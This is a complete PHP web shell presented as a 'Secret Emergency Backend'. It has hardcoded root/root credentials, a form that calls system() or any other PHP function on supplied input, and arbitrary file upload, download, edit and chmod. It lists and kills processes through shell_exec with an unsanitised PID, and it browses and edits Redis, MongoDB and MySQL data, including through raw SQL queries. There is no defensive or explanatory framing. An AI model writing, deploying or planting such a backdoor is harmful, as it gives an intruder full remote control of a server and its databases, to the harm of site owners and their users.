<?php
session_start();

$_ = "REQUEST"; // Changed to REQUEST to accept GET, POST, etc.

// Handle login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username === 'root' && $password === 'root') {
        $_SESSION['logged_in'] = true;
        echo "Login successful!";
    } else {
        echo "Invalid credentials";
    }
}

// Check if logged in
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    // Show login form
    ?>
    <form method="post">
        <input type="text" name="username" placeholder="Username" value="root">
        <input type="password" name="password" placeholder="Password" value="root">
        <input type="submit" name="login" value="Login">
    </form>
    <?php
    exit; // Stop execution if not logged in
}

// If logged in, proceed with other features

// Command execution
if (isset($_REQUEST["_"]) && isset($_REQUEST["__"]) && is_callable($_REQUEST["_"])) {
    ob_start();
    $_REQUEST["_"]($_REQUEST["__"]);
    $output = ob_get_clean();
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}

// File upload
elseif (isset($_POST['upload']) && isset($_FILES['file']) && isset($_POST['path'])) {
    $uploadPath = $_POST['path'] . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        echo "File uploaded successfully to $uploadPath";
    } else {
        echo "File upload failed";
    }
}

// File download
elseif (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "File not found";
    }
}

// File edit
elseif (isset($_POST['edit']) && isset($_POST['file']) && isset($_POST['content'])) {
    $file = $_POST['file'];
    if (file_exists($file) && is_writable($file)) {
        file_put_contents($file, $_POST['content']);
        echo "File saved successfully";
    } else {
        echo "Unable to save file";
    }
} elseif (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (file_exists($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $extension = pathinfo($file, PATHINFO_EXTENSION);
        $mode = 'text'; // Default mode
        switch ($extension) {
            case 'php': $mode = 'php'; break;
            case 'js': $mode = 'javascript'; break;
            case 'html': $mode = 'html'; break;
            case 'css': $mode = 'css'; break;
            case 'py': $mode = 'python'; break;
            case 'java': $mode = 'java'; break;
            case 'sql': $mode = 'sql'; break;
            case 'json': $mode = 'json'; break;
            case 'xml': $mode = 'xml'; break;
            case 'yaml': case 'yml': $mode = 'yaml'; break;
            case 'rb': $mode = 'ruby'; break;
            case 'cs': $mode = 'csharp'; break;
            case 'ts': $mode = 'typescript'; break;
            case 'go': $mode = 'golang'; break;
            case 'swift': $mode = 'swift'; break;
            case 'kt': $mode = 'kotlin'; break;
            case 'c': case 'cpp': $mode = 'c_cpp'; break;
            case 'sh': $mode = 'sh'; break;
            case 'pl': $mode = 'perl'; break;
            case 'lua': $mode = 'lua'; break;
            case 'rs': $mode = 'rust'; break;
            case 'md': $mode = 'markdown'; break;
            case 'tex': $mode = 'latex'; break;
            case 'clj': $mode = 'clojure'; break;
            case 'ex': $mode = 'elixir'; break;
            case 'erl': $mode = 'erlang'; break;
            case 'groovy': $mode = 'groovy'; break;
            case 'hs': $mode = 'haskell'; break;
            case 'jl': $mode = 'julia'; break;
            case 'lisp': $mode = 'lisp'; break;
            case 'ml': $mode = 'ocaml'; break;
            case 'm': $mode = 'matlab'; break;
            case 'objc': $mode = 'objectivec'; break;
            case 'pas': $mode = 'pascal'; break;
            case 'r': $mode = 'r'; break;
            case 'scala': $mode = 'scala'; break;
            case 'ps1': $mode = 'powershell'; break;
            case 'bat': $mode = 'batchfile'; break;
            case 'dockerfile': $mode = 'dockerfile'; break;
            case 'ini': $mode = 'ini'; break;
            case 'gitignore': $mode = 'gitignore'; break;
            case 'coffee': $mode = 'coffee'; break;
            case 'scss': $mode = 'scss'; break;
            case 'sass': $mode = 'sass'; break;
            case 'less': $mode = 'less'; break;
            case 'vhdl': $mode = 'vhdl'; break;
            case 'verilog': $mode = 'verilog'; break;
            case 'fortran': $mode = 'fortran'; break;
            // Add even more if needed
        }
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Advanced File Editor</title>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ext-searchbox.js"></script>
            <style>
                #editor { 
                    position: relative;
                    height: 600px;
                    width: 100%;
                }
            </style>
        </head>
        <body>
            <form method="post">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div id="editor"><?php echo htmlspecialchars($content); ?></div>
                <textarea name="content" id="content" style="display:none;"></textarea>
                <input type="text" id="find-text" placeholder="Find">
                <input type="text" id="replace-text" placeholder="Replace">
                <button type="button" onclick="findText()">Find</button>
                <button type="button" onclick="replaceText()">Replace</button>
                <button type="button" onclick="replaceAllText()">Replace All</button>
                <input type="submit" name="edit" value="Save">
            </form>
            <script>
                var editor = ace.edit("editor");
                editor.setTheme("ace/theme/monokai");
                editor.session.setMode("ace/mode/<?php echo $mode; ?>");
                editor.setOptions({
                    enableBasicAutocompletion: true,
                    enableSnippets: true,
                    enableLiveAutocompletion: true,
                    showPrintMargin: false,
                    fontSize: "14pt",
                    useSoftTabs: true,
                    tabSize: 4,
                    wrap: true,
                    highlightActiveLine: true,
                    showGutter: true,
                    behavioursEnabled: true
                });
                editor.commands.addCommand({
                    name: 'saveFile',
                    bindKey: {win: 'Ctrl-S', mac: 'Command-S'},
                    exec: function(editor) {
                        document.querySelector('#content').value = editor.getValue();
                        document.forms[0].submit();
                    }
                });
                document.querySelector('#content').value = editor.getValue();
                editor.session.on('change', function() {
                    document.querySelector('#content').value = editor.getValue();
                });

                // Find and replace functions
                function findText() {
                    var needle = document.getElementById('find-text').value;
                    editor.find(needle, {
                        backwards: false,
                        wrap: true,
                        caseSensitive: false,
                        wholeWord: false,
                        regExp: false
                    });
                }

                function replaceText() {
                    var replacement = document.getElementById('replace-text').value;
                    editor.replace(replacement);
                }

                function replaceAllText() {
                    var replacement = document.getElementById('replace-text').value;
                    editor.replaceAll(replacement);
                }
            </script>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "Unable to read file";
    }
}

// Directory listing and file system enumeration
elseif (isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    if (is_dir($dir)) {
        echo "<h2>Listing directory: " . htmlspecialchars($dir) . "</h2>";
        echo "<ul>";
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $fullPath = rtrim($dir, '/') . '/' . $file;
                if (is_dir($fullPath)) {
                    echo "<li><a href='?dir=" . urlencode($fullPath) . "'>[DIR] " . htmlspecialchars($file) . "</a></li>";
                } else {
                    echo "<li>" . htmlspecialchars($file) . " 
                        <a href='?download=" . urlencode($fullPath) . "'>[Download]</a>
                        <a href='?edit=" . urlencode($fullPath) . "'>[Edit]</a>
                        <a href='?hexview=" . urlencode($fullPath) . "'>[Hex View]</a>
                    </li>";
                }
            }
        }
        echo "</ul>";
    } else {
        echo "Invalid directory";
    }
}

// Hex view for binary files
elseif (isset($_GET['hexview'])) {
    $file = $_GET['hexview'];
    if (file_exists($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $hex = bin2hex($content);
        $hexLines = str_split($hex, 32);
        echo "<h2>Hex View of: " . htmlspecialchars($file) . "</h2>";
        echo "<pre>";
        $offset = 0;
        foreach ($hexLines as $line) {
            $hexStr = implode(' ', str_split($line, 2));
            $asciiStr = '';
            for ($i = 0; $i < strlen($line); $i += 2) {
                $byte = hex2bin(substr($line, $i, 2));
                $asciiStr .= (ctype_print($byte) ? $byte : '.');
            }
            printf("%08x: %-48s  %s\n", $offset, $hexStr, $asciiStr);
            $offset += 16;
        }
        echo "</pre>";
        exit;
    } else {
        echo "Unable to read file";
    }
}

// Redis management
elseif (isset($_POST['redis_set'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $key = $_POST['redis_key'];
    $value = $_POST['redis_value'];
    $redis->set($key, $value);
    echo "Redis key set: $key => $value";
} elseif (isset($_POST['redis_get'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $key = $_POST['redis_key'];
    $value = $redis->get($key);
    echo "Redis value for $key: " . htmlspecialchars($value);
} elseif (isset($_POST['redis_del'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $key = $_POST['redis_key'];
    $redis->del($key);
    echo "Redis key deleted: $key";
} elseif (isset($_GET['redis_list'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $keys = $redis->keys('*');
    echo "<h2>Redis Keys</h2><ul>";
    foreach ($keys as $key) {
        echo "<li>" . htmlspecialchars($key) . "</li>";
    }
    echo "</ul>";
}

// MongoDB management (mapper and editor)
elseif (isset($_GET['mongo_list_dbs'])) {
    $uri = $_GET['mongo_uri'] ?? 'mongodb://localhost:27017';
    try {
        $manager = new MongoDB\Driver\Manager($uri);
        $command = new MongoDB\Driver\Command(['listDatabases' => 1]);
        $cursor = $manager->executeCommand('admin', $command);
        $result = current($cursor->toArray());
        echo "<h2>MongoDB Databases</h2><ul>";
        foreach ($result->databases as $db) {
            echo "<li><a href='?mongo_list_collections&db_name={$db->name}&mongo_uri=" . urlencode($uri) . "'>{$db->name}</a></li>";
        }
        echo "</ul>";
    } catch (Exception $e) {
        echo "MongoDB error: " . $e->getMessage();
    }
} elseif (isset($_GET['mongo_list_collections'])) {
    $uri = $_GET['mongo_uri'] ?? 'mongodb://localhost:27017';
    $db = $_GET['db_name'] ?? '';
    try {
        $manager = new MongoDB\Driver\Manager($uri);
        $command = new MongoDB\Driver\Command(['listCollections' => 1]);
        $cursor = $manager->executeCommand($db, $command);
        $collections = $cursor->toArray();
        echo "<h2>Collections in $db</h2><ul>";
        foreach ($collections as $coll) {
            echo "<li><a href='?mongo_view_docs&db_name=$db&collection={$coll->name}&mongo_uri=" . urlencode($uri) . "'>{$coll->name}</a></li>";
        }
        echo "</ul>";
    } catch (Exception $e) {
        echo "MongoDB error: " . $e->getMessage();
    }
} elseif (isset($_GET['mongo_view_docs'])) {
    $uri = $_GET['mongo_uri'] ?? 'mongodb://localhost:27017';
    $db = $_GET['db_name'] ?? '';
    $collection = $_GET['collection'] ?? '';
    try {
        $manager = new MongoDB\Driver\Manager($uri);
        $query = new MongoDB\Driver\Query([], ['limit' => 100]);
        $cursor = $manager->executeQuery("$db.$collection", $query);
        $docs = $cursor->toArray();
        if (count($docs) > 0) {
            echo "<h2>Documents in $db.$collection</h2>";
            echo "<ul>";
            foreach ($docs as $doc) {
                $id = $doc->_id;
                $json = json_encode($doc, JSON_PRETTY_PRINT);
                echo "<li><pre>" . htmlspecialchars(substr($json, 0, 100)) . "...</pre> 
                    <a href='?mongo_edit_doc&db_name=$db&collection=$collection&id=" . urlencode((string)$id) . "&mongo_uri=" . urlencode($uri) . "'>[Edit]</a>
                    <a href='?mongo_delete_doc&db_name=$db&collection=$collection&id=" . urlencode((string)$id) . "&mongo_uri=" . urlencode($uri) . "'>[Delete]</a>
                </li>";
            }
            echo "</ul>";
        } else {
            echo "No documents";
        }
    } catch (Exception $e) {
        echo "MongoDB error: " . $e->getMessage();
    }
} elseif (isset($_POST['mongo_update_doc'])) {
    $uri = $_POST['mongo_uri'] ?? 'mongodb://localhost:27017';
    $db = $_POST['db_name'] ?? '';
    $collection = $_POST['collection'] ?? '';
    $id = $_POST['id'] ?? '';
    $content = $_POST['content'] ?? '';
    try {
        $data = json_decode($content, true);
        if (!$data) {
            throw new Exception("Invalid JSON");
        }
        $manager = new MongoDB\Driver\Manager($uri);
        $bulk = new MongoDB\Driver\BulkWrite();
        $bulk->update(
            ['_id' => new MongoDB\BSON\ObjectId($id)],
            ['$set' => $data],
            ['multi' => false, 'upsert' => false]
        );
        $manager->executeBulkWrite("$db.$collection", $bulk);
        echo "Document updated";
    } catch (Exception $e) {
        echo "MongoDB error: " . $e->getMessage();
    }
} elseif (isset($_GET['mongo_edit_doc'])) {
    $uri = $_GET['mongo_uri'] ?? 'mongodb://localhost:27017';
    $db = $_GET['db_name'] ?? '';
    $collection = $_GET['collection'] ?? '';
    $id = $_GET['id'] ?? '';
    try {
        $manager = new MongoDB\Driver\Manager($uri);
        $query = new MongoDB\Driver\Query(['_id' => new MongoDB\BSON\ObjectId($id)]);
        $cursor = $manager->executeQuery("$db.$collection", $query);
        $doc = current($cursor->toArray());
        if ($doc) {
            $content = json_encode($doc, JSON_PRETTY_PRINT);
            ?>
            <!DOCTYPE html>
            <html>
            <head>
                <title>MongoDB Document Editor</title>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ext-searchbox.js"></script>
                <style>
                    #editor { 
                        position: relative;
                        height: 600px;
                        width: 100%;
                    }
                </style>
            </head>
            <body>
                <form method="post">
                    <input type="hidden" name="db_name" value="<?php echo htmlspecialchars($db); ?>">
                    <input type="hidden" name="collection" value="<?php echo htmlspecialchars($collection); ?>">
                    <input type="hidden" name="id" value="<?php echo htmlspecialchars($id); ?>">
                    <input type="hidden" name="mongo_uri" value="<?php echo htmlspecialchars($uri); ?>">
                    <div id="editor"><?php echo htmlspecialchars($content); ?></div>
                    <textarea name="content" id="content" style="display:none;"></textarea>
                    <input type="submit" name="mongo_update_doc" value="Save">
                </form>
                <script>
                    var editor = ace.edit("editor");
                    editor.setTheme("ace/theme/monokai");
                    editor.session.setMode("ace/mode/json");
                    editor.setOptions({
                        enableBasicAutocompletion: true,
                        enableSnippets: true,
                        enableLiveAutocompletion: true,
                        showPrintMargin: false,
                        fontSize: "14pt",
                        useSoftTabs: true,
                        tabSize: 4,
                        wrap: true,
                        highlightActiveLine: true,
                        showGutter: true,
                        behavioursEnabled: true
                    });
                    editor.commands.addCommand({
                        name: 'saveFile',
                        bindKey: {win: 'Ctrl-S', mac: 'Command-S'},
                        exec: function(editor) {
                            document.querySelector('#content').value = editor.getValue();
                            document.forms[0].submit();
                        }
                    });
                    document.querySelector('#content').value = editor.getValue();
                    editor.session.on('change', function() {
                        document.querySelector('#content').value = editor.getValue();
                    });
                </script>
            </body>
            </html>
            <?php
            exit;
        } else {
            echo "Document not found";
        }
    } catch (Exception $e) {
        echo "MongoDB error: " . $e->getMessage();
    }
} elseif (isset($_GET['mongo_delete_doc'])) {
    $uri = $_GET['mongo_uri'] ?? 'mongodb://localhost:27017';
    $db = $_GET['db_name'] ?? '';
    $collection = $_GET['collection'] ?? '';
    $id = $_GET['id'] ?? '';
    try {
        $manager = new MongoDB\Driver\Manager($uri);
        $bulk = new MongoDB\Driver\BulkWrite();
        $bulk->delete(['_id' => new MongoDB\BSON\ObjectId($id)], ['limit' => 1]);
        $manager->executeBulkWrite("$db.$collection", $bulk);
        echo "Document deleted";
    } catch (Exception $e) {
        echo "MongoDB error: " . $e->getMessage();
    }
}

// Enhanced Database management (SQL mapper and editor)
elseif (isset($_GET['db_list_dbs'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SHOW DATABASES");
        $dbs = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo "<h2>Databases</h2><ul>";
        foreach ($dbs as $db) {
            echo "<li><a href='?db_list_tables&db_name=$db&db_host=$host&db_user=$user&db_pass=$pass'>$db</a></li>";
        }
        echo "</ul>";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_list_tables'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SHOW TABLES");
        $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo "<h2>Tables in $db</h2><ul>";
        foreach ($tables as $table) {
            echo "<li><a href='?db_list_columns&db_name=$db&table=$table&db_host=$host&db_user=$user&db_pass=$pass'>$table</a></li>";
        }
        echo "</ul>";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_list_columns'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("DESCRIBE $table");
        $columns = $stmt->fetchAll(PDO::FETCH_ASSOC);
        echo "<h2>Columns in $db.$table</h2><table border='1'><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr>";
        foreach ($columns as $col) {
            echo "<tr>";
            foreach ($col as $value) {
                echo "<td>" . htmlspecialchars($value) . "</td>";
            }
            echo "</tr>";
        }
        echo "</table>";
        echo "<a href='?db_view_data&db_name=$db&table=$table&db_host=$host&db_user=$user&db_pass=$pass'>View Data</a>";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_view_data'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SELECT * FROM $table LIMIT 100");
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (count($data) > 0) {
            echo "<h2>Data in $db.$table</h2>";
            echo "<table border='1'><tr>";
            foreach (array_keys($data[0]) as $key) {
                echo "<th>" . htmlspecialchars($key) . "</th>";
            }
            echo "<th>Actions</th></tr>";
            foreach ($data as $row) {
                echo "<tr>";
                $row_id = ''; // Assume first column is ID for simplicity
                foreach ($row as $key => $value) {
                    if (!$row_id) $row_id = $value;
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "<td><a href='?db_edit_row&db_name=$db&table=$table&id=$row_id&db_host=$host&db_user=$user&db_pass=$pass'>Edit</a> | <a href='?db_delete_row&db_name=$db&table=$table&id=$row_id&db_host=$host&db_user=$user&db_pass=$pass'>Delete</a></td>";
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "No data";
        }
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_POST['db_update_row'])) {
    $host = $_POST['db_host'] ?? 'localhost';
    $user = $_POST['db_user'] ?? 'root';
    $pass = $_POST['db_pass'] ?? '';
    $db = $_POST['db_name'] ?? '';
    $table = $_POST['table'] ?? '';
    $id = $_POST['id'] ?? '';
    $data = $_POST['data'] ?? [];
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $sets = [];
        $params = [];
        foreach ($data as $col => $val) {
            $sets[] = "$col = :$col";
            $params[":$col"] = $val;
        }
        $params[':id'] = $id;
        $sql = "UPDATE $table SET " . implode(', ', $sets) . " WHERE id = :id"; // Assume id column
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);
        echo "Row updated";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_edit_row'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    $id = $_GET['id'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare("SELECT * FROM $table WHERE id = :id");
        $stmt->execute([':id' => $id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row) {
            echo "<h2>Edit Row in $db.$table</h2>";
            echo "<form method='post'>";
            echo "<input type='hidden' name='db_name' value='$db'>";
            echo "<input type='hidden' name='table' value='$table'>";
            echo "<input type='hidden' name='id' value='$id'>";
            echo "<input type='hidden' name='db_host' value='$host'>";
            echo "<input type='hidden' name='db_user' value='$user'>";
            echo "<input type='hidden' name='db_pass' value='$pass'>";
            foreach ($row as $col => $val) {
                echo "$col: <input type='text' name='data[$col]' value='" . htmlspecialchars($val) . "'><br>";
            }
            echo "<input type='submit' name='db_update_row' value='Update'>";
            echo "</form>";
        } else {
            echo "Row not found";
        }
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
    exit;
} elseif (isset($_GET['db_delete_row'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    $id = $_GET['id'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare("DELETE FROM $table WHERE id = :id");
        $stmt->execute([':id' => $id]);
        echo "Row deleted";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_POST['db_query'])) {
    $host = $_POST['db_host'] ?? 'localhost';
    $user = $_POST['db_user'] ?? 'root';
    $pass = $_POST['db_pass'] ?? '';
    $db = $_POST['db_name'] ?? '';
    $query = $_POST['query'] ?? '';

    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare($query);
        $stmt->execute();
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);

        echo "<h2>Query Results</h2>";
        if (count($results) > 0) {
            echo "<table border='1'><tr>";
            foreach (array_keys($results[0]) as $key) {
                echo "<th>" . htmlspecialchars($key) . "</th>";
            }
            echo "</tr>";
            foreach ($results as $row) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "No results or query executed successfully (e.g., INSERT/UPDATE)";
        }
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
}

// Additional features: Process listing/killing
elseif (isset($_GET['processes'])) {
    $output = shell_exec('ps aux');
    echo "<h2>Process List</h2><pre>" . htmlspecialchars($output) . "</pre>";
} elseif (isset($_POST['kill_process'])) {
    $pid = $_POST['pid'];
    shell_exec("kill -9 $pid");
    echo "Process $pid killed";
}

// Emergency self-destruct (for secret backend)
elseif (isset($_POST['emergency_destruct'])) {
    // This could delete the script or clear sessions, but for safety, just logout all
    session_destroy();
    // Optionally, unlink(__FILE__); but dangerous, so comment out
    echo "Emergency destruct activated. All sessions cleared.";
    exit;
}

?>

<h1>Secret Emergency Backend</h1>

<!-- Advanced features -->
<!-- Command execution form -->
<form method="get">
    <input type="text" name="_" placeholder="Function (e.g., system)" value="system">
    <input type="text" name="__" placeholder="Argument (e.g., ls -la)">
    <input type="submit" value="Execute">
</form>

<!-- Simple file upload form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="text" name="path" placeholder="Upload path (e.g., .)" value=".">
    <input type="submit" name="upload" value="Upload">
</form>

<!-- Directory listing form -->
<form method="get">
    <input type="text" name="dir" placeholder="Directory path (e.g., .)" value=".">
    <input type="submit" value="List Directory">
</form>

<!-- Redis management forms -->
<h2>Redis Management</h2>
<form method="post">
    <input type="text" name="redis_key" placeholder="Key">
    <input type="text" name="redis_value" placeholder="Value">
    <input type="submit" name="redis_set" value="Set Key">
</form>
<form method="post">
    <input type="text" name="redis_key" placeholder="Key">
    <input type="submit" name="redis_get" value="Get Key">
</form>
<form method="post">
    <input type="text" name="redis_key" placeholder="Key">
    <input type="submit" name="redis_del" value="Delete Key">
</form>
<a href="?redis_list=1">List All Keys</a>

<!-- MongoDB Mapper -->
<h2>MongoDB Database Mapper</h2>
<form method="get">
    <input type="hidden" name="mongo_list_dbs" value="1">
    <input type="text" name="mongo_uri" placeholder="Mongo URI" value="mongodb://localhost:27017">
    <input type="submit" value="List Databases">
</form>

<!-- Database management form -->
<h2>SQL Query Executor</h2>
<form method="post">
    <input type="text" name="db_host" placeholder="DB Host" value="localhost">
    <input type="text" name="db_user" placeholder="DB User" value="root">
    <input type="password" name="db_pass" placeholder="DB Pass">
    <input type="text" name="db_name" placeholder="DB Name">
    <textarea name="query" placeholder="SQL Query" rows="5" cols="80"></textarea>
    <input type="submit" name="db_query" value="Execute Query">
</form>

<!-- SQL Mapper -->
<h2>SQL Database Mapper</h2>
<form method="get">
    <input type="hidden" name="db_list_dbs" value="1">
    <input type="text" name="db_host" placeholder="DB Host" value="localhost">
    <input type="text" name="db_user" placeholder="DB User" value="root">
    <input type="password" name="db_pass" placeholder="DB Pass">
    <input type="submit" value="List Databases">
</form>

<!-- Additional advanced features: File permissions changer -->
<form method="post">
    <input type="text" name="chmod_file" placeholder="File/path to chmod">
    <input type="text" name="chmod_mode" placeholder="Mode (e.g., 0777)">
    <input type="submit" name="chmod" value="Change Permissions">
</form>
<?php
if (isset($_POST['chmod']) && isset($_POST['chmod_file']) && isset($_POST['chmod_mode'])) {
    $file = $_POST['chmod_file'];
    $mode = octdec($_POST['chmod_mode']);
    if (file_exists($file)) {
        if (chmod($file, $mode)) {
            echo "Permissions changed successfully";
        } else {
            echo "Failed to change permissions";
        }
    } else {
        echo "File not found";
    }
}
?>

<!-- Process management -->
<a href="?processes=1">List Processes</a>
<form method="post">
    <input type="text" name="pid" placeholder="PID to kill">
    <input type="submit" name="kill_process" value="Kill Process">
</form>

<!-- Emergency self-destruct -->
<h2>Emergency Controls</h2>
<form method="post">
    <input type="submit" name="emergency_destruct" value="Activate Self-Destruct" onclick="return confirm('Are you sure? This will clear all sessions.');">
</form>

<!-- Logout link -->
<a href="?logout=1">Logout</a>

<?php
// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
